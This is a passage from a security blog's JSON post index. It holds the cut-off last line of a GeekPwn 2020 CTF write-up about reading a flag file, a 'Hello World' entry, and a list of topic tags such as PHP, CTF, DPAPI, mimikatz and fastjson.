读取f1L9@/flag.txt 拿到 flag","permalink":"https://rce.moe/2020/07/14/GeekPwn-2020-%E4%BA%91%E4%B8%8A%E6%8C%91%E6%88%98%E8%B5%9B-cosplay-witeup/","photos":[]},{"tags":[],"title":"Hello World","date":"2020/04/12","text":"第一个博客最近试试开始写点博客","permalink":"https://rce.moe/2020/04/12/hello-world/","photos":[]}],"categories":[],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://rce.moe/tags/%E7%AC%94%E8%AE%B0/"},{"name":"PHP","slug":"PHP","permalink":"https://rce.moe/tags/PHP/"},{"name":"CTF","slug":"CTF","permalink":"https://rce.moe/tags/CTF/"},{"name":"WRITEUP","slug":"WRITEUP","permalink":"https://rce.moe/tags/WRITEUP/"},{"name":"强网杯","slug":"强网杯","permalink":"https://rce.moe/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"},{"name":"DPAPI","slug":"DPAPI","permalink":"https://rce.moe/tags/DPAPI/"},{"name":"CHROME","slug":"CHROME","permalink":"https://rce.moe/tags/CHROME/"},{"name":"mimikatz","slug":"mimikatz","permalink":"https://rce.moe/tags/mimikatz/"},{"name":"fastjson","slug":"fastjson","permalink":"https://rce.moe/tags/fastjson/"}]}